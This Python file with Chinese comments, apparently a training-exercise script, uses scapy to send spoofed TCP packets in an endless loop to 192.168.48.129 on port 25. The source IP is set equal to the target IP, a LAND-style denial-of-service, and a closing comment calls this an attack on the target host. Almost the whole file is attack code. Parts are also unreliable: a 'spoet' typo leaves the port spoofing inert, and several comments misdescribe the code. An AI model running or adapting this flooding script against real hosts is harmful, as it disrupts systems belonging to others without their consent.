# -*- codeing = utf-8 -*-
# 时间:2021/11/29 19:28
# 作者:CK
# 文件名:青岛题.py
# 开发环境:PyCharm
from scapy.all import *#导入socket模块，并引用所有的功能
import time#导入time这个模块

def tcpconn(packet):#自定义函数

    sendp(packet)
eth=Ether()#将以太网的协议放进eth这个变量里
ip=IP()#将IP的协议放进eth这个变量里
ip.dst='192.168.48.129'#锁定对方的IP的目的地址
tcp=TCP()#将TCP的协议放进eth这个变量里
tcp.dport=25#填写目的端口

m=0#计数器

while True:#无限循环
    ip.src=ip.dst#ip的相对路径等于IP的目的地址
    tcp.spoet=tcp.dport#指定源端口与目标端口一致
    #以上两句是用于伪造IP和端口，保证能正常发送数据，正常发送数据，不用源IP和源端口
    packet=eth/ip/tcp#Ether、IP和TCP三层协议的组合
    tcpconn(packet)#调用自定义函数
    print('Sending Packet To %s'%ip.dst+'Port Is %s'%tcp.dport)#打印
    time.sleep(0.5)#每0.5秒输出一次
    m=m+1#每运行一次计数器加一
    print(m)#打印计数器
    '原理：通过目标主机的IP和端口，锁定到目标主句，然后发起攻击'